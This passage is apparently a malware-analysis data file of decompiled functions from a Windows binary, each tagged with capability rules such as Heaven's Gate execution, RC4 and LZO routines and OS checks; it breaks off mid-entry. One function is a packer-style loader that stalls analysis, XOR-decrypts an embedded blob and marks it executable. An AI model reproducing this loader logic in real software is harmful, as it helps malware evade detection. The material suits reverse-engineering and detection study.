{
    "004011d0": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.004011d0(void)\n\n{\n    uint arg_8h;\n    uchar auStack2076 [16];\n    uchar auStack2060 [2052];\n    uint32_t uStack8;\n    \n    uStack8 = *0x8cd008 ^ auStack2076;\n    (**0x40b150)(0, auStack2060, 0, auStack2076, 0, 0);\n    *0x8eeb60 = 0x6b;\n    *0x8eeb64 = 0x72;\n    *0x8eeb66 = 0x6e;\n    *0x8eeb62 = 0x65;\n    *0x8eeb68 = 0x65;\n    *0x8eeb6a = 0x6c;\n    *0x8eeb6c = 0x33;\n    *0x8eeb6e = 0x32;\n    *0x8eeb70 = 0x2e;\n    *0x8eeb72 = 100;\n    arg_8h = 0x8eeb60;\n    *0x8eeb74 = 0x6c;\n    *0x8eeb76 = 0x6c;\n    *0x8eeb78 = 0;\n    (**0x40b004)();\n    fcn.0040294a(arg_8h);\n    return;\n}\n",
        "token_count": 319
    },
    "00401390": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.00401390(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint uVar16;\n    uint uVar17;\n    uint uVar18;\n    uint uVar19;\n    uint uVar20;\n    uint uVar21;\n    uint uVar22;\n    uint uVar23;\n    uint uVar24;\n    uint uVar25;\n    uint uVar26;\n    uint uVar27;\n    uint uVar28;\n    uint uVar29;\n    uint uVar30;\n    uint uVar31;\n    int32_t iVar32;\n    int32_t iVar33;\n    int32_t iVar34;\n    uint32_t unaff_EBX;\n    uint32_t uVar35;\n    int32_t in_FS_OFFSET;\n    uint32_t uVar36;\n    uint32_t uVar37;\n    uchar auStack580 [4];\n    uint32_t uStack576;\n    int32_t iStack572;\n    uint uStack568;\n    uint uStack564;\n    uint uStack560;\n    uint uStack556;\n    uint uStack552;\n    uint uStack548;\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    uint uStack532;\n    uint uStack528;\n    uint uStack524;\n    uint uStack520;\n    uint uStack516;\n    uint uStack512;\n    uint uStack508;\n    uint uStack504;\n    uint uStack500;\n    uint uStack496;\n    uint uStack492;\n    uint uStack488;\n    uint uStack484;\n    uint uStack480;\n    uint uStack476;\n    uint uStack472;\n    uint uStack468;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint uStack448;\n    uint uStack444;\n    uint uStack440;\n    uint uStack436;\n    uint uStack432;\n    uint uStack428;\n    uint uStack424;\n    uint uStack420;\n    uint uStack416;\n    uint uStack412;\n    uint uStack408;\n    uint uStack404;\n    uint uStack400;\n    uint uStack396;\n    uint uStack392;\n    uint uStack388;\n    uint uStack384;\n    uint uStack380;\n    uint uStack376;\n    uint uStack372;\n    uint uStack368;\n    uint uStack364;\n    uint uStack360;\n    uint uStack356;\n    uint uStack352;\n    uint uStack348;\n    uint uStack344;\n    uint uStack340;\n    uint uStack336;\n    uint uStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uint uStack316;\n    uint uStack312;\n    uint uStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uint uStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t aiStack160 [2];\n    int32_t iStack152;\n    int32_t iStack148;\n    uchar auStack144 [16];\n    uchar auStack128 [20];\n    int32_t iStack108;\n    int32_t iStack92;\n    uchar auStack68 [68];\n    \n    uStack440 = 0xe250f6be;\n    uStack280 = 0x8cce72ff;\n    uStack300 = 0xcc41f113;\n    uStack404 = 0x472ff892;\n    uStack356 = 0x7b0bd34;\n    uStack384 = 0x4899fab3;\n    uStack372 = 0x2e447430;\n    uStack548 = 0x5c12ab43;\n    uStack296 = 0xe238fcbb;\n    uStack528 = 0x6a7bd24a;\n    uStack416 = 0x7eafc5d6;\n    uStack196 = 0xc9724660;\n    uStack288 = 0xa0f046d6;\n    uStack348 = 0x38b4f1e5;\n    uStack480 = 0x55dbf796;\n    uStack568 = 0x1e61efd9;\n    uStack224 = 0x9c1b9278;\n    uStack512 = 0x728ed9c6;\n    uStack524 = 0x76efcbb9;\n    uStack424 = 0xf219fd9a;\n    uStack212 = 0x6e861f6a;\n    uStack432 = 0x8a5233e;\n    uStack396 = 0x23770823;\n    uStack240 = 0xfb407544;\n    uStack336 = 0x4236a144;\n    uStack444 = 0x7b2221e0;\n    uStack316 = 0x13d2850;\n    uStack164 = 0x26177c81;\n    uStack436 = 0x6746d7fb;\n    uStack540 = 0x8aa1e101;\n    uStack392 = 0x32995444;\n    uStack484 = 0x82f0d2db;\n    uStack448 = 0xb2801a97;\n    uStack228 = 0x95949fb1;\n    uStack368 = 0xc9ad6ce4;\n    uStack268 = 0x5c38fcb4;\n    uStack192 = 0xefdb687;\n    uStack504 = 0xbcb53b55;\n    uStack276 = 0xf045c48d;\n    uStack560 = 0x20da822a;\n    uStack216 = 0x56772ccb;\n    uStack272 = 0xcdbc12b4;\n    uStack412 = 0x4b27692f;\n    uStack244 = 0xf58175c7;\n    uStack452 = 0x13a829a7;\n    uStack564 = 0x831a479c;\n    uStack476 = 0x289c8224;\n    uStack352 = 0xd38ace8d;\n    uStack344 = 0x5edf10e3;\n    uStack328 = 0xa41692c8;\n    uStack460 = 0x1ae08131;\n    uStack388 = 0x918cc358;\n    uStack364 = 0x998ae88f;\n    uStack532 = 0x3b021b45;\n    uStack176 = 0xeaf14697;\n    uStack420 = 0x48a7ea8d;\n    uStack188 = 0xd64515a6;\n    uStack544 = 0xedbb150b;\n    uStack256 = 0x32b32e6a;\n    uStack400 = 0xf5d779ef;\n    uStack320 = 0x6d8fc6ab;\n    uStack380 = 0x25cc214f;\n    uStack520 = 0xc4cee978;\n    uStack200 = 0x1c2f88f8;\n    uStack236 = 0xe1b619b6;\n    uStack428 = 0x3b704947;\n    uStack264 = 0x1532088d;\n    uStack208 = 0x81c3476d;\n    uStack516 = 0x64b5129a;\n    uStack552 = 0xbeedb760;\n    uStack508 = 0x367538e3;\n    uStack292 = 0xcb482d55;\n    uStack184 = 0x4b4a7bfb;\n    uStack340 = 0x3530694b;\n    uStack180 = 0xbac6c777;\n    uStack464 = 0x933b0210;\n    uStack204 = 0xda8a13b1;\n    uStack260 = 0xca9c910e;\n    uStack492 = 0x6a571e68;\n    uStack312 = 0x2cc4eac7;\n    uStack324 = 0x81740b63;\n    uStack284 = 0x5996e3a1;\n    uStack376 = 0xd56bcff5;\n    uStack408 = 0x37029063;\n    uStack556 = 0xfa9c2b91;\n    uStack500 = 0xe7d98a9b;\n    uStack536 = 0x5f954d1d;\n    uStack304 = 0x746aa19f;\n    uStack168 = 0xa5f7d40a;\n    uStack252 = 0xc2403e3a;\n    uStack360 = 0x1f68cfea;\n    uStack496 = 0x67be28eb;\n    uStack332 = 0x5d3a45f9;\n    uStack220 = 0xf964e604;\n    uStack232 = 0x67b6272e;\n    uStack472 = 0x487496aa;\n    uStack248 = 0x3068184;\n    uStack468 = 0x864534a0;\n    uStack488 = 0xf0c051e2;\n    uStack308 = 0xf98550cb;\n    uStack172 = 0x30fd81de;\n    uStack456 = 0xff6a76f6;\n    uVar5 = 0x1e61efd9;\n    uVar6 = 0x20da822a;\n    uVar7 = 0x5c12ab43;\n    uVar8 = 0xf0c051e2;\n    uVar9 = 0x55dbf796;\n    uVar10 = 0x933b0210;\n    uVar11 = 0xff6a76f6;\n    uVar12 = 0xf219fd9a;\n    uVar13 = 0x48a7ea8d;\n    uVar14 = 0x7eafc5d6;\n    uVar15 = 0x37029063;\n    uVar16 = 0xf5d779ef;\n    uVar17 = 0x918cc358;\n    uVar18 = 0xd56bcff5;\n    uVar19 = 0x2e447430;\n    uVar20 = 0x1f68cfea;\n    uVar21 = 0xd38ace8d;\n    uVar22 = 0x3530694b;\n    uVar23 = 0x6d8fc6ab;\n    uVar24 = 0x746aa19f;\n    uVar25 = 0xcc41f113;\n    uVar26 = 0xa0f046d6;\n    uVar27 = 0x1532088d;\n    uVar28 = 0xfb407544;\n    uVar29 = 0x67b6272e;\n    uVar30 = 0xeaf14697;\n    uVar31 = 0x30fd81de;\n    if ((iStack148 == 0x159) &&\n       (uVar5 = uStack568,  uVar6 = uStack560,  uVar7 = uStack548,  uVar8 = uStack488,  uVar9 = uStack480, \n       uVar10 = uStack464,  uVar11 = uStack456,  uVar12 = uStack424,  uVar13 = uStack420,  uVar14 = uStack416, \n       uVar15 = uStack408,  uVar16 = uStack400,  uVar17 = uStack388,  uVar18 = uStack376,  uVar19 = uStack372, \n       uVar20 = uStack360,  uVar21 = uStack352,  uVar22 = uStack340,  uVar23 = uStack320,  uVar24 = uStack304, \n       uVar25 = uStack300,  uVar26 = uStack288,  uVar27 = uStack264,  uVar28 = uStack240,  uVar29 = uStack232, \n       uVar30 = uStack176,  uVar31 = uStack172,  aiStack160[0] == 0x216)) {\n        uStack568 = 0x1e61efd9;\n        uStack560 = 0x20da822a;\n        uStack548 = 0x5c12ab43;\n        uStack488 = 0xf0c051e2;\n        uStack480 = 0x55dbf796;\n        uStack464 = 0x933b0210;\n        uStack456 = 0xff6a76f6;\n        uStack424 = 0xf219fd9a;\n        uStack420 = 0x48a7ea8d;\n        uStack416 = 0x7eafc5d6;\n        uStack408 = 0x37029063;\n        uStack400 = 0xf5d779ef;\n        uStack388 = 0x918cc358;\n        uStack376 = 0xd56bcff5;\n        uStack372 = 0x2e447430;\n        uStack360 = 0x1f68cfea;\n        uStack352 = 0xd38ace8d;\n        uStack340 = 0x3530694b;\n        uStack320 = 0x6d8fc6ab;\n        uStack304 = 0x746aa19f;\n        uStack300 = 0xcc41f113;\n        uStack288 = 0xa0f046d6;\n        uStack264 = 0x1532088d;\n        uStack240 = 0xfb407544;\n        uStack232 = 0x67b6272e;\n        uStack176 = 0xeaf14697;\n        uStack172 = 0x30fd81de;\n        (**0x40b030)(auStack68);\n        (**0x40b00c)(0, 0);\n        (**0x40b048)(0, 0, 0, 0, 0);\n        (**0x40b038)(0, 0, 0, 0);\n        (**0x40b15c)(0, 0);\n        (**0x40b164)(0, \"yoneluherupedicavecayijotopaya.jpg\", 0, 0, 0, 0);\n        (**0x40b168)(0);\n        (**0x40b160)(0, 0, 0);\n        (**0x40b154)(0, 0, 0, 0);\n        (**0x40b158)(0, 0, 0);\n        pcVar1 = *0x40b050;\n        iVar32 = (**0x40b050)();\n        if (iVar32 == 0) {\n            (**0x40b010)(0, 0);\n        }\n        else {\n            (*pcVar1)();\n            (**0x40b044)();\n        }\n        (**0x40b008)(0, 0);\n        fcn.00402bf9(0);\n        uVar5 = uStack568;\n        uVar6 = uStack560;\n        uVar7 = uStack548;\n        uVar8 = uStack488;\n        uVar9 = uStack480;\n        uVar10 = uStack464;\n        uVar11 = uStack456;\n        uVar12 = uStack424;\n        uVar13 = uStack420;\n        uVar14 = uStack416;\n        uVar15 = uStack408;\n        uVar16 = uStack400;\n        uVar17 = uStack388;\n        uVar18 = uStack376;\n        uVar19 = uStack372;\n        uVar20 = uStack360;\n        uVar21 = uStack352;\n        uVar22 = uStack340;\n        uVar23 = uStack320;\n        uVar24 = uStack304;\n        uVar25 = uStack300;\n        uVar26 = uStack288;\n        uVar27 = uStack264;\n        uVar28 = uStack240;\n        uVar29 = uStack232;\n        uVar30 = uStack176;\n        uVar31 = uStack172;\n    }\n    uStack172 = uVar31;\n    uStack176 = uVar30;\n    uStack232 = uVar29;\n    uStack240 = uVar28;\n    uStack264 = uVar27;\n    uStack288 = uVar26;\n    uStack300 = uVar25;\n    uStack304 = uVar24;\n    uStack320 = uVar23;\n    uStack340 = uVar22;\n    uStack352 = uVar21;\n    uStack360 = uVar20;\n    uStack372 = uVar19;\n    uStack376 = uVar18;\n    uStack388 = uVar17;\n    uStack400 = uVar16;\n    uStack408 = uVar15;\n    uStack416 = uVar14;\n    uStack420 = uVar13;\n    uStack424 = uVar12;\n    uStack456 = uVar11;\n    uStack464 = uVar10;\n    uStack480 = uVar9;\n    uStack488 = uVar8;\n    uStack548 = uVar7;\n    uStack560 = uVar6;\n    uStack568 = uVar5;\n    pcVar2 = *0x40b028;\n    pcVar1 = *0x40b014;\n    uStack576 = *0x8ce004 + 0x932;\n    iVar32 = 0;\n    do {\n        (*pcVar1)(0, 0);\n        (**0x40b01c)(0);\n        (**0x40b018)(0, auStack144);\n        (**0x40b14c)(0, 0);\n        if (((((iVar32 < 0x552b20) || (iStack108 == 0x344631)) || (iStack572 == 0x7f7c)) || (iStack572 == 0x52cca9)) &&\n           (iVar32 < 0x301)) {\n            (**0x40b054)(0);\n        }\n        if (*0x8d0adc == 0) {\n            *0x8d0600 = 0x6b;\n            *0x8d0601 = 0x65;\n            *0x8d0602 = 0x72;\n            *0x8d0603 = 0x6e;\n            *0x8d0604 = 0x65;\n            *0x8d0605 = 0x6c;\n            *0x8d0606 = 0x33;\n            *0x8d0607 = 0x32;\n            *0x8d0608 = 0x2e;\n            *0x8d0609 = 100;\n            *0x8d060a = 0x6c;\n            *0x8d060b = 0x6c;\n            *0x8d060c = 0;\n            *0x8d0adc = (*pcVar2)(0x8d0600);\n        }\n        pcVar4 = *0x40b05c;\n        pcVar3 = *0x40b034;\n        iVar32 = iVar32 + 1;\n    } while (iVar32 < 0xc35f);\n    iVar32 = 0;\n    while( true ) {\n        (*pcVar3)(0, aiStack160);\n        (*pcVar4)(auStack128);\n        if (((0xc9e77 < iVar32) && (iStack152 != 0x25caa81d)) && (iStack92 != 0x2090c5)) break;\n        iVar32 = iVar32 + 1;\n    }\n    uVar36 = uStack576;\n    *0x8d0ad8 = (**0x40b000)(0);\n    iVar32 = *0x8ce000;\n    pcVar1 = *0x40b044;\n    uVar35 = 0;\n    uVar37 = unaff_EBX;\n    if (unaff_EBX != 0) {\n        do {\n            if (uVar35 == 0) {\n                (**0x40b03c)(0, 0, 0, 0, 0, 0, 0);\n                (**0x40b040)(0);\n            }\n            (**0x40b020)();\n            *(uVar35 + *0x8d0ad8) = *(iVar32 + 0x1264 + uVar35);\n            fcn.004011c0();\n            (*pcVar1)();\n            uVar35 = uVar35 + 1;\n        } while (uVar35 < unaff_EBX);\n    }\n    fcn.00401110(&stack0xfffffdb8);\n    iVar32 = *0x8d0ad8;\n    iVar33 = 0;\n    *0x8d0ad0 = *0x40c3f4;\n    iVar34 = *0x40c3f4;\n    if (0 < uVar37) {\n        do {\n            iVar34 = iVar34 * 0x343fd + 0x269ec3;\n            *0x8d0ad2 = iVar34 >> 0x10;\n            *0x8d0ad0 = iVar34;\n            *(iVar33 + iVar32) = *(iVar33 + iVar32) ^ *0x8d0ad2;\n            iVar33 = iVar33 + 1;\n        } while (iVar33 < uVar37);\n    }\n    (**0x40b058)(*0x8d0ad8, uVar37, 0x40, auStack580);\n    iVar32 = 0;\n    while (((**0x40b020)(),  (uVar36 & 0xffff) == 0x34adb9 || (iVar32 != 0x5fc0))) {\n        iVar32 = iVar32 + 1;\n        if (0x12f091 < iVar32) {\n            *(**(in_FS_OFFSET + 0x2c) + 4) = 1;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 5149
    },
    "0040294a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040294a(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x8cd008) {\n        return;\n    }\n    *0x8cfcf8 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x8cfcfc = &arg_8h;\n    *0x8cfc38 = 0x10001;\n    *0x8cfbe0 = 0xc0000409;\n    *0x8cfbe4 = 1;\n    var_328h = *0x8cd008;\n    var_324h = *0x8cd00c;\n    *0x8cfbec = unaff_retaddr;\n    *0x8cfcc4 = in_GS;\n    *0x8cfcc8 = in_FS;\n    *0x8cfccc = in_ES;\n    *0x8cfcd0 = in_DS;\n    *0x8cfcd4 = unaff_EDI;\n    *0x8cfcd8 = unaff_ESI;\n    *0x8cfcdc = unaff_EBX;\n    *0x8cfce0 = in_EDX;\n    *0x8cfce4 = in_ECX;\n    *0x8cfce8 = in_EAX;\n    *0x8cfcec = unaff_EBP;\n    *0x8cfcf0 = unaff_retaddr;\n    *0x8cfcf4 = in_CS;\n    *0x8cfd00 = in_SS;\n    *0x8cfc30 = (**0x40b07c)();\n    fcn.00405ccd(1);\n    (**0x40b078)(0);\n    (**0x40b074)(0x40b1e0);\n    if (*0x8cfc30 == 0) {\n        fcn.00405ccd(1);\n    }\n    uVar1 = (**0x40b050)(0xc0000409);\n    (**0x40b010)(uVar1);\n    return;\n}\n",
        "token_count": 821
    },
    "00402acd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00402bc0: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00402bc5)\n// WARNING: Removing unreachable block (ram,0x00402bf3)\n// WARNING: Removing unreachable block (ram,0x00402bcb)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00402acd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t unaff_EBP;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403368(0x8cc3b0, 0x18);\n    fcn.00404f42(8);\n    *(unaff_EBP + -4) = 0;\n    if (*0x8cfbd0 != 1) {\n        *0x8cfbcc = 1;\n        *0x8cfbc8 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar1 = fcn.004046c0(*0x92bdb0);\n            *(unaff_EBP + -0x28) = piVar1;\n            if (piVar1 != NULL) {\n                piVar2 = fcn.004046c0(*0x92bdac);\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x1c) = piVar1;\n                *(unaff_EBP + -0x20) = piVar2;\n                while( true ) {\n                    piVar2 = piVar2 + -1;\n                    *(unaff_EBP + -0x24) = piVar2;\n                    if (piVar2 < piVar1) break;\n                    iVar3 = fcn.004046b7();\n                    if (*piVar2 != iVar3) {\n                        if (piVar2 < piVar1) break;\n                        pcVar4 = fcn.004046c0(*piVar2);\n                        iVar3 = fcn.004046b7();\n                        *piVar2 = iVar3;\n                        (*pcVar4)();\n                        iVar3 = fcn.004046c0(*0x92bdb0);\n                        piVar1 = fcn.004046c0(*0x92bdac);\n                        if ((*(unaff_EBP + -0x1c) != iVar3) || (*(unaff_EBP + -0x20) != piVar1)) {\n                            *(unaff_EBP + -0x1c) = iVar3;\n                            *(unaff_EBP + -0x28) = iVar3;\n                            *(unaff_EBP + -0x20) = piVar1;\n                            *(unaff_EBP + -0x24) = piVar1;\n                            piVar2 = piVar1;\n                        }\n                        piVar1 = *(unaff_EBP + -0x28);\n                    }\n                }\n            }\n            fcn.00402a07(0x40b1a8);\n        }\n        fcn.00402a07(0x40b1b0);\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.00404e68(8);\n    }\n    return;\n}\n",
        "token_count": 804
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004055ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.004055ee(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.00404e68(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "00407659": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00407659(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.004046b7();\n    var_4h = 0;\n    if (*0x8d051c == 0) {\n        iVar2 = (**0x40b028)(\"USER32.DLL\");\n        pcVar4 = *0x40b024;\n        if (iVar2 == 0) {\n            return 0;\n        }\n        arg_8h_00 = (**0x40b024)(iVar2, \"MessageBoxA\");\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x8d051c = fcn.00404645(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, \"GetActiveWindow\");\n        *0x8d0520 = fcn.00404645(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetLastActivePopup\");\n        *0x8d0524 = fcn.00404645(uVar3);\n        uVar3 = (*pcVar4)(iVar2, \"GetUserObjectInformationA\");\n        *0x8d052c = fcn.00404645(uVar3);\n        if (*0x8d052c != 0) {\n            uVar3 = (*pcVar4)(iVar2, \"GetProcessWindowStation\");\n            *0x8d0528 = fcn.00404645(uVar3);\n        }\n    }\n    if ((*0x8d0528 != iVar1) && (*0x8d052c != iVar1)) {\n        pcVar4 = fcn.004046c0(*0x8d0528);\n        pcVar5 = fcn.004046c0(*0x8d052c);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x0040779b;\n        }\n    }\n    if ((((*0x8d0520 != iVar1) && (pcVar4 = fcn.004046c0(*0x8d0520),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x8d0524 != iVar1 && (pcVar4 = fcn.004046c0(*0x8d0524),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x0040779b:\n    pcVar4 = fcn.004046c0(*0x8d051c);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 819
    },
    "0040406a": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040406a(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00403368(0x8cc418, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00403181();\n        *puVar2 = 0;\n        puVar2 = fcn.0040316e();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x92ac78)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x92ac80;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00407288(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.0040316e();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00403181();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00403937(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040413c(0x8cc418);\n                goto code_r0x00404136;\n            }\n        }\n        puVar2 = fcn.00403181();\n        *puVar2 = 0;\n        puVar2 = fcn.0040316e();\n        *puVar2 = 9;\n        fcn.00403106(0, 0, 0, 0, 0);\n    }\ncode_r0x00404136:\n    fcn.004033ad();\n    return;\n}\n",
        "token_count": 622
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401000(uint8_t *param_1)\n\n{\n    uint8_t in_AL;\n    uint8_t *unaff_ESI;\n    uint8_t *unaff_EDI;\n    \n    // [00] -r-x section size 40960 named .text\n    *param_1 = *param_1 | (in_AL & 0x30) << 2;\n    *unaff_EDI = *unaff_EDI | (in_AL & 0xfc) << 4;\n    *unaff_ESI = *unaff_ESI | in_AL << 6;\n    return;\n}\n",
        "token_count": 134
    },
    "00401110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00401110(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puStack4;\n    \n    iVar1 = (**0x40b02c)(0, *param_1);\n    uVar2 = 0;\n    uVar3 = 0;\n    if (*param_1 == 0) {\n        *param_1 = 0;\n        *0x8d0ad8 = iVar1;\n        return;\n    }\n    do {\n        iVar4 = CONCAT12(*(*0x8d0ad8 + 2 + uVar3), CONCAT11(*(*0x8d0ad8 + 1 + uVar3), *(*0x8d0ad8 + uVar3))) << 8;\n        fcn.00401000(&stack0xfffffff1);\n        *(uVar2 + iVar1) = iVar4 >> 8;\n        *(uVar2 + 1 + iVar1) = iVar4 >> 0x10;\n        *(uVar2 + 2 + iVar1) = iVar4 >> 0x18;\n        uVar3 = uVar3 + 4;\n        uVar2 = uVar2 + 3;\n    } while (uVar3 < *puStack4);\n    *puStack4 = uVar2;\n    *0x8d0ad8 = iVar1;\n    return;\n}\n",
        "token_count": 328
    },
    "00402bf9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
